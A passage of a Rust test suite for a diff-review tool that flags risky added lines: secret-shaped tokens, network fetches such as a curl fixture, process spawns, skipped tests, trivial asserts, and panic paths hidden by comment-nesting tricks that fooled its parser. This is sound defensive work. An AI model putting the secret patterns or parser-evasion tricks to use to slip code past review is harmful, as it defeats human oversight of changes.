        );
        assert_eq!(
            signals(&added("package.json", &["  \"name\": \"install-helper\","])),
            []
        );
    }

    #[test]
    fn secrets_are_found_by_shape_and_never_copied() {
        // Built at run time, so the repository's own secret scan never sees a token here.
        let aws = format!("key = \"AKIA{}\"", "Q7".repeat(8));
        let forge = format!("t='ghp_{}'", "a1".repeat(18));
        let chat = format!("# xoxb-{}", "12345-abcde");
        let stripe = format!("sk_live_{}", "Z".repeat(16));
        let header = format!("-----BEGIN {} PRIVATE KEY-----", "RSA");
        for line in [&aws, &forge, &chat, &stripe, &header] {
            assert_eq!(
                signals(&added("notes.txt", &[line])),
                [S::SecretLike],
                "{line}"
            );
        }
        for line in [
            format!("AKIA{}", "Q".repeat(15)),
            format!("XAKIA{}", "Q".repeat(16)),
            format!("ghp_{}", "a".repeat(35)),
            "-----BEGIN CERTIFICATE-----".to_owned(),
        ] {
            assert_eq!(signals(&added("notes.txt", &[&line])), [], "{line}");
        }
        let found = file_evidence(&added("notes.txt", &[&aws]));
        assert!(
            !format!("{found:?}").contains("AKIA"),
            "a secret was copied into evidence"
        );
    }

    #[test]
    fn a_path_scoped_rule_follows_the_generated_rule_and_a_token_rule_does_not() {
        assert_eq!(
            signals(&added("target/debug/build.rs", &["fn main() {}"])),
            []
        );
        assert_eq!(
            signals(&added(
                "node_modules/x/package.json",
                &["\"postinstall\": \"x\""]
            )),
            []
        );
        assert_eq!(
            signals(&added(
                "src/generated/x.rs",
                &["std::process::Command::new(\"curl\");"]
            )),
            [S::ProcessSpawn]
        );
    }

    #[test]
    fn suppressions_are_read_in_comments() {
        assert_eq!(
            signals(&added("x.py", &["import os  # noqa: F401"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.ts", &["// @ts-ignore"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("x.go", &["x := y //nolint:errcheck"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added("src/x.rs", &["#[allow(dead_code)]"])),
            [S::CheckSuppressed]
        );
        assert_eq!(
            signals(&added(
                "src/x.rs",
                &["#[expect(dead_code, reason = \"r\")]"]
            )),
            []
        );
    }

    #[test]
    fn a_shebang_names_the_language_of_a_file_with_no_extension() {
        let patch = "--- /dev/null\n+++ b/bin/fetch\n@@ -0,0 +1,2 @@\n+#!/usr/bin/env bash\n+curl -fsSL https://x\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), [S::NetworkFetch]);
        let patch = "--- /dev/null\n+++ b/bin/notes\n@@ -0,0 +1,1 @@\n+curl is a tool\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn duplicates_are_reported_once_and_order_is_stable() {
        let file = added("src/x.rs", &["unsafe { unsafe { f() } }", "unsafe {}"]);
        let lines: Vec<u32> = file_evidence(&file).iter().map(|e| e.line).collect();
        assert_eq!(lines, [2, 3]);
        assert_eq!(file_evidence(&file), file_evidence(&file.clone()));
    }

    /// Batteries, phase 1: the ways a change makes a test stop testing, and unfinished work
    /// presented as done. Each is read as code on an added line.
    #[test]
    fn a_skipped_test_a_trivial_assert_and_a_stub_are_evidence() {
        let cases: &[(&str, &str, EvidenceSignal)] = &[
            ("tests/a.rs", "#[ignore]", S::TestSkipped),
            ("tests/a.rs", "#[ignore = \"slow\"]", S::TestSkipped),
            (
                "test_a.py",
                "@pytest.mark.skip(reason=\"later\")",
                S::TestSkipped,
            ),
            (
                "test_a.py",
                "@pytest.mark.skipif(sys.platform == \"win32\")",
                S::TestSkipped,
            ),
            ("test_a.py", "@pytest.mark.xfail", S::TestSkipped),
            ("test_a.py", "    pytest.skip(\"later\")", S::TestSkipped),
            (
                "test_a.py",
                "@unittest.skipUnless(HAVE, \"x\")",
                S::TestSkipped,
            ),
            (
                "test_a.py",
                "        self.skipTest(\"later\")",
                S::TestSkipped,
            ),
            ("a.test.ts", "it.skip(\"adds\", () => {});", S::TestSkipped),
            (
                "a.test.ts",
                "describe.skip(\"suite\", () => {});",
                S::TestSkipped,
            ),
            ("a.test.ts", "test.todo(\"adds\");", S::TestSkipped),
            ("a.test.ts", "xit(\"adds\", () => {});", S::TestSkipped),
            ("a_test.go", "\tt.Skip(\"later\")", S::TestSkipped),
            ("a_test.go", "\tt.SkipNow()", S::TestSkipped),
            ("tests/a.rs", "    assert!(true);", S::TrivialAssert),
            (
                "tests/a.rs",
                "    assert_eq!(true, true);",
                S::TrivialAssert,
            ),
            ("test_a.py", "    assert True", S::TrivialAssert),
            (
                "test_a.py",
                "        self.assertTrue(True)",
                S::TrivialAssert,
            ),
            ("a.test.ts", "  expect(true).toBe(true);", S::TrivialAssert),
            ("a.test.ts", "  assert.ok(true);", S::TrivialAssert),
            ("src/a.rs", "    todo!()", S::StubAdded),
            ("src/a.rs", "    unimplemented!(\"later\")", S::StubAdded),
            ("a.py", "    raise NotImplementedError", S::StubAdded),
            (
                "a.py",
                "    raise NotImplementedError(\"later\")",
                S::StubAdded,
            ),
        ];
        for (path, line, signal) in cases {
            assert_eq!(signals(&added(path, &[line])), [*signal], "{path}: {line}");
        }
    }

    /// The same words where they are not that code: no evidence.
    #[test]
    fn near_misses_of_the_integrity_tokens_are_not_evidence() {
        let cases: &[(&str, &str)] = &[
            (
                "tests/a.rs",
                "// #[ignore] was here; assert!(true) and todo!() too",
            ),
            ("tests/a.rs", "let s = \"#[ignore] assert!(true) todo!()\";"),
            ("tests/a.rs", "#[ignored_by_default]"),
            ("tests/a.rs", "    assert!(true_enough(x));"),
            ("tests/a.rs", "    debug_assert!(truer);"),
            ("src/a.rs", "    my_todo!(x)"),
            (
                "test_a.py",
                "# pytest.mark.skip, assert True, raise NotImplementedError",
            ),
            ("test_a.py", "x = \"pytest.skip(\""),
            ("test_a.py", "    assert True_value"),
            ("test_a.py", "    assert Trueish is None"),
            ("a.py", "    raise NotImplementedErrorSubclass()"),
            ("a.py", "    x.raise_NotImplementedError()"),
            ("a.test.ts", "exit(code);"),
            ("a.test.ts", "submit.skip(1);"),
            ("a.test.ts", "console.assert(true);"),
            ("a.test.ts", "// it.skip(\"x\")"),
            ("a_test.go", "\tctx.t.Skip(\"x\")"),
            ("a_test.go", "\tit.Skip(\"x\")"),
            // the tokens of another language are not this file's
            ("a.go", "\ttodo!()"),
            ("a.ts", "#[ignore]"),
        ];
        for (path, line) in cases {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
    }

    /// A file from hunk body lines written as in a patch (`+`, `-` or a space first), after one
    /// context line `x`.
    fn hunk_of(path: &str, body: &[&str]) -> ReviewFile {
        let old = 1 + body.iter().filter(|l| !l.starts_with('+')).count();
        let new = 1 + body.iter().filter(|l| !l.starts_with('-')).count();
        let mut text = format!("--- a/{path}\n+++ b/{path}\n@@ -1,{old} +1,{new} @@\n x\n");
        for line in body {
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    /// A hunk that is the beginning of a new file: `body` lines without their `+`.
    fn new_file(path: &str, body: &[&str]) -> ReviewFile {
        let mut text = format!(
            "diff --git a/{path} b/{path}\nnew file mode 100644\n--- /dev/null\n+++ b/{path}\n@@ -0,0 +1,{} @@\n",
            body.len()
        );
        for line in body {
            text.push('+');
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    fn found(file: &ReviewFile) -> Vec<(EvidenceSignal, Basis, u32)> {
        file_evidence(file)
            .iter()
            .map(|e| (e.signal, e.basis, e.line))
            .collect()
    }

    /// Batteries, slice 2: a handler and its empty body are read together, on the line that
    /// opens the handler, and say that they were (`hunk`).
    #[test]
    fn an_error_handler_with_nothing_in_it_is_evidence_read_across_two_lines() {
        let swallowed = [(S::ErrorSwallowed, Basis::Hunk, 2)];
        let cases: &[(&str, &[&str])] = &[
            ("a.py", &["+except ValueError:", "+    pass"]),
            (
                "a.py",
                &["+    except (KeyError, OSError) as e:", "+        ..."],
            ),
            ("a.py", &["+except Exception: pass"]),
            (
                "a.py",
                &["+except:  # nothing to do", "+    pass  # really"],
            ),
            ("a.ts", &["+} catch (e) {}"]),
            ("a.ts", &["+} catch { }"]),
            ("a.ts", &["+} catch (err) {", "+}"]),
            ("a.ts", &["+try { f(); } catch ({ message }) {", "+}"]),
            ("a.go", &["+\tif err != nil {", "+\t}"]),
            ("a.go", &["+\tif err != nil {}"]),
            ("a.go", &["+\tif err := f(); err != nil {", "+\t}"]),
            // the body is the next line of the new file: a removed line between is not it,
            // and an unchanged line is
            (
                "a.py",
                &["+except ValueError:", "-    handle()", "+    pass"],
            ),
            ("a.py", &["+except ValueError:", "     pass"]),
        ];
        for (path, body) in cases {
            assert_eq!(found(&hunk_of(path, body)), swallowed, "{path}: {body:?}");
        }
    }

    /// An arm or an assignment that drops the error on one line is found by its token.
    #[test]
    fn an_error_dropped_on_one_line_is_lexical_evidence() {
        for (path, line) in [
            ("src/a.rs", "        Err(_) => {}"),
            ("src/a.rs", "        Err(_) => (),"),
            ("a.go", "\t_ = err"),
        ] {
            assert_eq!(
                found(&added(path, &[line])),
                [(S::ErrorSwallowed, Basis::Lexical, 2)],
                "{path}: {line}"
            );
        }
    }

    /// A handler that does something, one whose body the hunk does not show, and the same
    /// words elsewhere: no evidence.
    #[test]
    fn a_handler_that_handles_or_whose_body_is_unseen_is_not_evidence() {
        let cases: &[(&str, &[&str])] = &[
            ("a.py", &["+except ValueError:", "+    log(e)"]),
            ("a.py", &["+except ValueError:"]),
            ("a.py", &["+except ValueError:", "-    pass"]),
            ("a.py", &["+except ValueError: return None"]),
            ("a.py", &["+exceptional = 1", "+pass"]),
            ("a.py", &["+# except ValueError: pass"]),
            ("a.py", &["+s = \"except ValueError: pass\""]),
            ("a.py", &["+else:", "+    pass"]),
            ("a.ts", &["+} catch (e) { log(e); }"]),
            ("a.ts", &["+} catch (e) {", "+  log(e);"]),
            ("a.ts", &["+} catch (e) {"]),
            // a promise handler that does something (an empty one is evidence since review V3
            // round 1; before, no `.catch(…)` was read at all)
            ("a.ts", &["+p.catch((e) => { log(e); });"]),
            ("a.ts", &["+const catcher = {};"]),
            ("a.ts", &["+// } catch (e) {}"]),
            ("a.go", &["+\tif err != nil {", "+\t\treturn err"]),
            ("a.go", &["+\tif err == nil {", "+\t}"]),
            ("a.go", &["+\tif err != nil && retry {", "+\t}"]),
            ("a.go", &["+\tfor err != nil {", "+\t}"]),
            ("a.go", &["+\t_ = errors.New(\"x\")"]),
            ("src/a.rs", &["+        Err(e) => {}"]),
            ("src/a.rs", &["+        Err(_) => { log(); }"]),
            // another language's form
            ("a.go", &["+except ValueError:", "+    pass"]),
            ("a.py", &["+} catch (e) {}"]),
        ];
        for (path, body) in cases {
            assert_eq!(found(&hunk_of(path, body)), [], "{path}: {body:?}");
        }
    }

    /// A removed empty handler is the repair, and reading neighbours changes nothing a token
    /// rule finds: the same line, the same signals, the first rung.
    #[test]
    fn the_neighbour_reading_rule_leaves_token_evidence_as_it_was() {
        assert_eq!(
            found(&hunk_of("a.py", &["-except ValueError:", "-    pass"])),
            []
        );
        let file = hunk_of(
            "a.py",
            &["+import subprocess", "+subprocess.run(x)", "+eval(y)"],
        );
        assert_eq!(
            found(&file),
            [
                (S::ProcessSpawn, Basis::Lexical, 3),
                (S::DynamicEval, Basis::Lexical, 4),
            ]
        );
        assert_eq!(
            (Basis::Lexical.label(), Basis::Hunk.label()),
            ("lexical", "hunk")
        );
        assert!(Basis::Hunk > Basis::Lexical);
    }

    /// Rung 2: the new side of a Rust hunk is parsed, and what the parser reads is evidence
    /// whatever its spelling. An item it confirms says so.
    #[test]
    fn the_parser_finds_rust_constructs_whatever_their_spelling() {
        let cases: &[(&str, &[&str], EvidenceSignal)] = &[
            (
                "src/a.rs",
                &["+    let v = f().unwrap();"],
                S::PanicPathAdded,
            ),
            (
                "src/a.rs",
                &["+    let v = f()", "+        .expect(\"set\");"],
                S::PanicPathAdded,
            ),
            ("tests/a.rs", &["+    assert!( true );"], S::TrivialAssert),
            (
                "tests/a.rs",
                &["+    assert!(true, \"always\");"],
                S::TrivialAssert,
            ),
            (
                "tests/a.rs",
                &["+    assert_eq!(true , true);"],
                S::TrivialAssert,
            ),
            (
                "tests/a.rs",
                &["+#[cfg_attr(miri, ignore)]", "+fn slow() {}"],
                S::TestSkipped,
            ),
            (
                "tests/a.rs",
                &["+#[ignore]", "+fn slow() {}"],
                S::TestSkipped,
            ),
            ("src/a.rs", &["+    todo!( )"], S::StubAdded),
            // the hunk closes a block it did not open, and opens one it does not close
            (
                "src/a.rs",
                &[
                    "     y",
                    " }",
                    "+fn b() {",
                    "+    if c {",
                    "+        h().unwrap();",
                ],
                S::PanicPathAdded,
            ),
        ];
        for (path, body, signal) in cases {
            let items = found(&hunk_of(path, body));
            assert_eq!(items.len(), 1, "{path}: {body:?}: {items:?}");
            assert_eq!(
                (items[0].0, items[0].1),
                (*signal, Basis::SyntaxFragment),
                "{path}: {body:?}"
            );
        }
        assert_eq!(Basis::SyntaxFragment.label(), "syntax_fragment");
        assert!(Basis::SyntaxFragment > Basis::Hunk);
    }

    /// The decision of 2026-11-14 (D1): the parser never removes evidence. A panic path under
    /// an exact `#[cfg(test)]`, first attribute of a top-level item of a file the patch
    /// creates whole, used to be withdrawn as proved test code. The second independent review
    /// compiled four files that met every condition and panicked in production code (IR2-H-1
    /// to IR2-H-4). Now each such item stands, at the same score as anywhere, and says
    /// `test_likely`. Before, each of these three files gave no evidence.
    #[test]
    fn a_panic_path_under_cfg_test_in_a_new_file_stands_and_is_marked_test_likely() {
        let marks = |body: &[&str]| -> Vec<(EvidenceSignal, Basis, u32, bool)> {
            file_evidence(&new_file("src/a.rs", body))
                .iter()
                .map(|e| (e.signal, e.basis, e.line, e.test_likely))
                .collect()
        };
        assert_eq!(
            marks(&[
                "pub fn real() {}",
                "",
                "#[cfg(test)]",
                "mod checks {",
                "    use super::*;",
                "    #[test]",
                "    fn a() {",
                "        assert_eq!(parse(\"x\").unwrap(), 1);",
                "        f().expect(\"set\");",
                "    }",
                "}",
            ]),
            [
                (S::PanicPathAdded, Basis::Lexical, 8, true),
                (S::PanicPathAdded, Basis::SyntaxFragment, 9, true),
            ]
        );
        assert_eq!(
            marks(&["#[cfg(test)]", "fn helper() {", "    f().unwrap();", "}"]),
            [(S::PanicPathAdded, Basis::SyntaxFragment, 3, true)]
        );
        assert_eq!(
            marks(&[
                "/// For tests.",
                "#[cfg(test)]",
                "#[inline]",
                "impl Thing {",
                "    fn make() -> Self { f().expect(\"x\") }",
                "}",
            ]),
            [(S::PanicPathAdded, Basis::SyntaxFragment, 5, true)]
        );
        // the mark changes no score: the same file without the attribute scores the same
        let score = |body: &[&str]| crate::risk::score_file(&new_file("src/a.rs", body)).0;
        assert_eq!(
            score(&["#[cfg(test)]", "fn helper() {", "    f().unwrap();", "}"]),
            score(&["#[inline]", "fn helper() {", "    f().unwrap();", "}"])
        );
    }

    /// Review V3 round 4, VD3R4-H-1. A hunk of an existing file that says it starts at line 1
    /// is not the beginning of the file: the header is the patch writer's word, and `git apply
    /// --unidiff-zero` or `-C0` applies the hunk further down, under a comment opened above
    /// it. Before, this production panic path was withdrawn. Since 2026-11-14 nothing is
    /// withdrawn anywhere, and these stay as cases that must keep their item.
    #[test]
    fn a_hunk_that_only_says_it_starts_the_file_keeps_its_panic_path() {
        let forged = parse(
            "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -1,4 +1,4 @@\n #[cfg(test)] // */\n fn production() {\n-    safe();\n+    load().unwrap();\n }\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(
            found(&forged),
            [(S::PanicPathAdded, Basis::SyntaxFragment, 3)]
        );
        // every line added and line 1 claimed, but the file is not new
        let inserted = parse(
            "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -0,0 +1,4 @@\n+#[cfg(test)]\n+fn helper() {\n+    load().unwrap();\n+}\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(
            found(&inserted),
            [(S::PanicPathAdded, Basis::SyntaxFragment, 3)]
        );
        // a new file in two hunks: neither is the whole file
        let two = parse(
            "diff --git a/src/a.rs b/src/a.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/a.rs\n@@ -0,0 +1,4 @@\n+#[cfg(test)]\n+fn helper() {\n+    load().unwrap();\n+}\n@@ -0,0 +5,1 @@\n+fn more() {}\n",
        );
        if let Ok(mut files) = two {
            let file = files.remove(0);
            assert!(
                found(&file).iter().any(|item| item.0 == S::PanicPathAdded),
                "a new file in two hunks was believed"
            );
        }
    }

    /// The owner's decision of 2026-11-14, on the reviewer's suggestion: a panic path that the
    /// hunk shows under a test attribute is not withdrawn (no test attribute is proof) and is
    /// not scored differently (a hint must not weaken a judge); it is marked, so that a reader
    /// can tell it from the same call in code that shows no sign of being a test.
    #[test]
    fn a_panic_path_under_a_test_attribute_stands_and_is_marked_test_likely() {
        let marks = |file: &ReviewFile| -> Vec<(EvidenceSignal, u32, bool)> {
            file_evidence(file)
                .iter()
                .map(|e| (e.signal, e.line, e.test_likely))
                .collect()
        };
        // in a change to an existing file, with one call inside another macro's arguments
        let test = hunk_of(
            "src/a.rs",
            &[
                "+#[test]",
                "+fn a() {",
                "+    f().unwrap();",
                "+    assert_eq!(g().unwrap(), 1);",
                "+}",
            ],
        );
        assert_eq!(
            marks(&test),
            [(S::PanicPathAdded, 4, true), (S::PanicPathAdded, 5, true)]
        );
        for attribute in ["+#[tokio::test]", "+#[rstest]", "+#[cfg(test)]"] {
            let file = hunk_of(
                "src/a.rs",
                &[attribute, "+fn a() {", "+    f().unwrap();", "+}"],
            );
            assert_eq!(marks(&file), [(S::PanicPathAdded, 4, true)], "{attribute}");
        }
        // code that shows no sign of being a test, and the function after a test
        let plain = hunk_of(
            "src/a.rs",
            &[
                "+#[test]",
                "+fn a() {}",
                "+fn real() {",
                "+    f().unwrap();",
                "+}",
            ],
        );
        assert_eq!(marks(&plain), [(S::PanicPathAdded, 5, false)]);
        // Review V3 round 7, VD3R7-L-1: a production function on the same line as a test, and
        // one line that holds a call of each
        for (line, marked) in [
            (
                "+#[test] fn check() {} fn production() { b().unwrap(); }",
                false,
            ),
            (
                "+#[test] fn check() { a().unwrap(); } fn production() { b().unwrap(); }",
                false,
            ),
            ("+#[test] fn check() { a().unwrap(); }", true),
        ] {
            assert_eq!(
                marks(&hunk_of("src/a.rs", &[line])),
                [(S::PanicPathAdded, 2, marked)],
                "{line}"
            );
        }
        // a test inside another macro's body is not read, and gets no hint (declared)
        let in_macro = hunk_of(
            "src/a.rs",
            &[
                "+outer! {",
                "+    #[test]",
                "+    fn check() {",
                "+        f().unwrap();",
                "+    }",
                "+}",
            ],
        );
        assert_eq!(marks(&in_macro), [(S::PanicPathAdded, 5, false)]);
        // only a panic path carries the mark
        let other = hunk_of(
            "tests/a.rs",
            &["+#[test]", "+fn a() {", "+    todo!();", "+}"],
        );
        assert_eq!(marks(&other), [(S::StubAdded, 4, false)]);
        // the parser did not read the hunk: nothing is known, so nothing is marked
        let long = format!("+    f().unwrap(); // {}", "a".repeat(70_000));
        let unread = hunk_of("src/a.rs", &["+#[test]", "+fn a() {", long.as_str(), "+}"]);
        let items = file_evidence(&unread);
        assert!(!items.is_empty() && items.iter().all(|e| !e.test_likely));
        // a hint weakens nothing: the score is the score of the same call anywhere
        let unmarked = hunk_of(
            "src/a.rs",
            &["+fn a() {", "+    f().unwrap();", "+}", "+// x", "+// y"],
        );
        assert_eq!(
            crate::risk::score_file(&test).0,
            crate::risk::score_file(&unmarked).0
        );
    }

    /// Review V3 round 5, VD3R5-H-1. One section creates a file whose `#[cfg(test)]` a line
    /// comment follows; a later section for the same path prepends `/*`. Git applies both, and
    /// the function is in the program. Before, the panic path was withdrawn; then the plan
    /// counted the sections that name a path. Since 2026-11-14 a created file is read like any
    /// hunk: alone or beside another section, in either order, the item stands.
    #[test]
    fn a_created_file_is_read_like_any_other_hunk() {
        let created = "diff --git a/src/d.rs b/src/d.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/d.rs\n@@ -0,0 +1,4 @@\n+#[cfg(test)] // */\n+fn production() {\n+    load().unwrap();\n+}\n";
        let prepended = "diff --git a/src/d.rs b/src/d.rs\n--- a/src/d.rs\n+++ b/src/d.rs\n@@ -1,1 +1,2 @@\n+/*\n #[cfg(test)] // */\n";
        let stands = [(S::PanicPathAdded, Basis::SyntaxFragment, 3)];
        let alone = parse(created).unwrap();
        assert_eq!(FragmentPlan::of(&alone).reading(0, 0), Reading::Hunk);
        assert_eq!(found(&alone[0]), stands);
        assert!(file_evidence(&alone[0])[0].test_likely);
        let mut both = parse(created).unwrap();
        both.extend(parse(prepended).unwrap());
        let mut reversed = parse(prepended).unwrap();
        reversed.extend(parse(created).unwrap());
        for files in [both, reversed] {
            let plan = FragmentPlan::of(&files);
            let at = files
                .iter()
                .position(|file| {
                    file.path == "src/d.rs" && file.patch_twin.hunks[0].lines.len() == 4
                })
                .unwrap();
            let items: Vec<(EvidenceSignal, Basis, u32)> =
                file_evidence_in(&files[at], plan.file(at))
                    .iter()
                    .map(|e| (e.signal, e.basis, e.line))
                    .collect();
            assert_eq!(items, stands);
        }
    }

    /// Independent review, IR-H-1. The withdrawal went by line: a production function that
    /// shares a line with a proved test function lost its panic path whenever the parser named
    /// no construct for it (the function form, or a call inside a macro's arguments). Compiled
    /// and run, both functions panicked. Nothing is withdrawn now; what goes by the line is
    /// the hint, and a line has it only when all its code lies inside one item that spells a
    /// test.
    #[test]
    fn a_production_call_on_the_line_of_a_test_stands_and_has_no_hint() {
        let marks = |body: &[&str]| -> Vec<(EvidenceSignal, u32, bool)> {
            file_evidence(&new_file("src/a6.rs", body))
                .iter()
                .map(|e| (e.signal, e.line, e.test_likely))
                .collect()
        };
        assert_eq!(
            marks(&[
                "#[cfg(test)]",
                "fn t() { a().unwrap(); } pub fn production() -> u32 { Result::unwrap(crate::b()) }",
                "pub fn production2() -> u32 { vec![crate::b().unwrap()][0] } #[cfg(test)] fn t2() { a().unwrap(); }",
            ]),
            [(S::PanicPathAdded, 2, false), (S::PanicPathAdded, 3, false)]
        );
        // the controls: the test function alone on its line has the hint, with the attribute
        // on the line above or on the same line, and a comment after it is not code. Each of
        // these was withdrawn before 2026-11-14.
        for (body, line) in [
            (&["#[cfg(test)]", "fn t() { a().unwrap(); }"][..], 2),
            (
                &["#[cfg(test)] fn t() { a().unwrap(); } // only in tests"][..],
                1,
            ),
            (
                &[
                    "#[cfg(test)]",
                    "mod t {",
                    "    fn f() { vec![b().unwrap()][0] }",
                    "}",
                ][..],
                3,
            ),
        ] {
            assert_eq!(marks(body), [(S::PanicPathAdded, line, true)], "{body:?}");
        }
        // and the hint goes the same way: a production call in a macro's arguments beside a test
        let hinted: Vec<bool> = file_evidence(&hunk_of(
            "src/a.rs",
            &["+#[test] fn check() { a().unwrap(); } pub fn p() -> u32 { vec![b().unwrap()][0] }"],
        ))
        .iter()
        .map(|item| item.test_likely)
        .collect();
        assert_eq!(hinted, [false]);
    }

    /// Independent review, IR-H-2 and IR-L-1, and the second independent review, IR2-H-1 to
    /// IR2-H-4. Each of these is a new file in which the grammar sees a top-level item under
    /// an exact `#[cfg(test)]`, with no error in the tree, and the compiler sees production
    /// code: a first line the grammar reads as a shebang, a statement at the top level, a
    /// `//*` inside a block comment (the grammar does not count the nested opener), a
    /// character whose low byte is `*` or `/` (the grammar's scanner cuts it to eight bits), a
    /// comment the lexer's code view ends too early, and a `cr"\"` that is a raw string only
    /// from edition 2021. Each was compiled and run to a panic, and each gave no evidence. The
    /// parser removes nothing now, so each reports its panic path.
    #[test]
    fn a_file_the_compiler_reads_otherwise_keeps_its_panic_path() {
        for (body, line) in [
            (
                &[
                    "#! /**/ [allow(unused)] /*",
                    "#[cfg(test)] // */",
                    "pub mod t {",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                ][..],
                4,
            ),
            (
                &[
                    "---x",
                    ";#[cfg(test)] /*",
                    "---",
                    "// */",
                    "mod t {",
                    "    pub fn production() -> u32 { super::b().unwrap() }",
                    "}",
                ][..],
                6,
            ),
            // IR2-H-1
            (
                &[
                    "/* //* */ #[cfg(test)] // */",
                    "pub mod t {",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                ][..],
                3,
            ),
            // IR2-H-2, both ways
            (
                &[
                    "macro_rules! live { (#[cfg(test)] $($rest:tt)*) => { $($rest)* }; }",
                    "/* įĪ */ live! { // */",
                    "#[cfg(test)]",
                    "pub mod t {",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                    "/* įĪ */ } // */",
                ][..],
                5,
            ),
            (
                &[
                    "/* /* Īį */ #[cfg(test)] // */",
                    "pub mod t {",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                ][..],
                3,
            ),
            // IR2-H-3, with a method call and with the function form
            (
                &[
                    "#[cfg(test)]",
                    "fn t() { a().unwrap(); /* /* */ \" */ } pub fn production() -> u32 { crate::b().unwrap() }",
                    "/* /* */ } */",
                ][..],
                2,
            ),
            (
                &[
                    "#[cfg(test)]",
                    "fn t() { a().unwrap(); /* /* */ // */ } pub fn production() -> u32 { Result::unwrap(crate::b()) }",
                    "/* /* */ } */",
                ][..],
                2,
            ),
            // IR2-H-4
            (
                &[
                    "macro_rules! live { ($a:ident $b:literal $($rest:tt)*) => { $($rest)* }; }",
                    "live! { cr\"\\\" }",
                    "#[cfg(test)] pub mod t { // \"",
                    "    pub fn production() -> u32 { crate::b().unwrap() }",
                    "}",
                ][..],
                4,
            ),
        ] {
            let items = found(&new_file("src/s.rs", body));
            assert!(
                items
                    .iter()
                    .any(|item| (item.0, item.2) == (S::PanicPathAdded, line)),
                "{body:?}: {items:?}"
            );
        }
    }

    /// Second independent review, IR2-L-1. The lexer's code view ends a block comment at the
    /// first `*/`, so after `/* /* */ " */` it takes the rest of the line for a string, and
    /// the production function there was not seen: the line counted as lying wholly inside
    /// the test function and carried `test_likely`. A panic path the parser names outside
    /// every item that spells a test takes the hint from its line.
    #[test]
    fn a_production_call_after_a_nested_comment_takes_the_hint_from_its_line() {
        let hints = |body: &[&str]| -> Vec<(u32, bool)> {
            file_evidence(&new_file("src/n1.rs", body))
                .iter()
                .filter(|e| e.signal == S::PanicPathAdded)
                .map(|e| (e.line, e.test_likely))
                .collect()
        };
        assert_eq!(
            hints(&[
                "#[cfg(test)]",
                "fn t() { a().unwrap(); /* /* */ \" */ } pub fn production() -> u32 { crate::b().unwrap() }",
            ]),
            [(2, false)]
        );
        assert_eq!(
            hints(&[
                "#[cfg(test)]",
                "fn t() { a().unwrap(); /* /* */ // */ } pub fn production() -> u32 { Result::unwrap(crate::b()) }",
            ]),
            [(2, false)]
        );
        // the control: the test function alone, with the same comment, keeps the hint
        assert_eq!(
            hints(&["#[cfg(test)]", "fn t() { a().unwrap(); /* /* */ \" */ }",]),
            [(2, true)]
        );
    }

    /// Independent review, IR-M-2. Inside another macro's body the parser names no construct.
    /// Whatever spells one of its constructs there and is read by no token rule either is
    /// marked: before, each of these left nothing, while the same hunk past the parser's
    /// budget did carry the mark.
    #[test]
    fn a_word_of_the_parsers_that_nothing_read_is_unchecked() {
        let inside = |lines: &[&str]| {
            let mut body = vec![" // ctx", "+outer! {"];
            body.extend_from_slice(lines);
            body.extend_from_slice(&["+}", " // ctx"]);
            found(&hunk_of("src/x.rs", &body))
                .iter()
                .map(|item| item.0)
                .collect::<Vec<_>>()
        };
        for lines in [
            &["+    assert!", "+    (true);"][..],
            &["+    assert", "+    !(true);"][..],
            &["+    todo", "+    !();"][..],
            &["+    let v = x.unwrap", "+    ();"][..],
            &["+    let v = x.", "+    unwrap();"][..],
            &["+    #", "+    [ignore]"][..],
            &["+    #[", "+    ignore]"][..],
            &["+    assert!{true};"][..],
            &["+    assert![true];"][..],
            &["+    todo![];"][..],
            &["+    unimplemented!{};"][..],
            &["+    it.map(assert);"][..],
        ] {
            assert_eq!(inside(lines), [S::SyntaxUnchecked], "{lines:?}");
        }
        // what a token rule read whole is its answer, an item or none, and is not marked
        let read: &[(&[&str], &[EvidenceSignal])] = &[
            (&["+    assert!(a == b);"], &[]),
            (&["+    assert_eq!(a.len(), 3, \"expected three\");"], &[]),
            (&["+    let ignored = unwrap_or(expected, todos);"], &[]),
            (&["+    assert!(true);"], &[S::TrivialAssert]),
            (&["+    x.unwrap();"], &[S::PanicPathAdded]),
            (&["+    todo!();"], &[S::StubAdded]),
            (&["+    #[ignore]", "+    fn a() {}"], &[S::TestSkipped]),
            (&["+    it.map(Result::unwrap);"], &[S::PanicPathAdded]),
        ];
        for (lines, expected) in read {
            assert_eq!(inside(lines), *expected, "{lines:?}");
        }
        // outside a macro's body the parser reads each of the first group itself
        assert_eq!(
            found(&hunk_of(
                "tests/x.rs",
                &["+fn a() {", "+    assert!", "+    (true);", "+}"]
            ))
            .iter()
            .map(|item| (item.0, item.1))
            .collect::<Vec<_>>(),
            [(S::TrivialAssert, Basis::SyntaxFragment)]
        );
    }

    /// Independent review, IR-M-3: a conditional skip whose condition changed is another skip.
    /// The test ran everywhere but under Miri and now runs nowhere. Before, the attribute was
    /// "the same construct as before" because it carried the same signal.
    #[test]
    fn a_conditional_skip_whose_condition_changed_is_evidence() {
        let changed = found(&hunk_of(
            "tests/slow.rs",
            &[
                " #[test]",
                " #[cfg_attr(",
                "-    miri,",
                "+    all(),",
                "     ignore",
                " )]",
                " fn slow() {",
            ],
        ));
        assert_eq!(changed, [(S::TestSkipped, Basis::SyntaxFragment, 4)]);
        // Second independent review, IR2-M-1: the comparison went by the attribute's words,
        // which leave out what is nested in a list and what is a string. Each of these changes
        // the condition under which the test is skipped, and each was "the same attribute":
        // no evidence. The whole text is compared now.
